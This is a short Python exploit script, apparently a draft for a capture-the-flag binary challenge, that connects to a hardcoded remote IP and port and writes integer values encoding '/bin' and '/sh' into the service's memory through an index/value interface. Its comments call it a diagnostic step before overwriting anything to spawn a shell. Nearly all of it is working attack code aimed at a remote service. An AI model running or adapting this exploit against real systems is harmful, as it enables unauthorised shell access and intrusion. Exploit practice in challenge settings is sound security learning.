#!/usr/bin/env python3
"""
Step-by-step exploit to diagnose the issue
"""
import socket
import time

s = socket.socket()
s.settimeout(10)

print("[*] Connecting...")
s.connect(('34.84.25.24', 58554))

def send_val(idx, val):
    """Send one index/value pair"""
    data = s.recv(1024)
    print(f"  Recv: {data[:50]}")
    
    s.sendall(f"{idx}\n".encode())
    time.sleep(0.05)
    
    data = s.recv(1024)
    print(f"  Recv: {data[:50]}")
    
    s.sendall(f"{val}\n".encode())
    time.sleep(0.05)

# Test: Just write /bin/sh and exit, don't overwrite anything yet
print("\n[1] Writing '/bin'...")
send_val(0, 1852400175)

print("\n[2] Writing '/sh'...")
send_val(1, 6845231)

print("\n[3] Exiting normally...")
data = s.recv(1024)
print(f"  Recv: {data}")
s.sendall(b"-1\n")
time.sleep(0.5)

print("\n[4] Reading final output...")
s.settimeout(2)
try:
    final = s.recv(4096)
    print(f"Final output:\n{final.decode(errors='ignore')}")
except Exception as e:
    print(f"Error: {e}")

s.close()
print("\n[*] Test 1 complete (no overwrites, should exit cleanly)")
